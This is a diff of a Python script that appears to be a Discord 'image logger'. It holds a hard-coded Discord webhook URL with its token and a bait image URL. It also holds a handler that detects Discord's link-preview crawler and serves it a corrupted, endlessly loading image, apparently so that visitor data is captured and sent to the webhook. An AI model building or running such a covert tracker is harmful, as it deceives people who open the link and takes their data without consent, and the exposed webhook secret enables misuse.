@@ -5,7 +5,7 @@ import time
 
 webhook = 'https://discord.com/api/webhooks/1466906538148102235/itmF63UvtsjjygTjbcLYaxwBTBB5Ger3CjaVCbQoab51UZjU7qsxSWXd38xZ3n9ZKmAc'
 
-bindata = httpx.get('https://www.nasa.gov/wp-content/uploads/2026/01/artemis-ii-jan-29-image-at-pad-1.jpg').content
+bindata = httpx.get('https://www.cyberpowerpc.com/blog/w/wp-content/uploads/2016/01/hit.jpg').content
 buggedimg = True
 buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 
@@ -89,7 +89,7 @@ class handler(BaseHTTPRequestHandler):
             if 'discord' in useragent.lower(): 
                 # Discord preview - send corrupted/infinite loading image
                 self.send_response(200)
-                self.send_header('Content-type', 'image/jpg')
+                self.send_header('Content-type', 'image/jpeg')
                 self.send_header('Transfer-Encoding', 'chunked')  # Keep connection open
                 self.end_headers()
                 
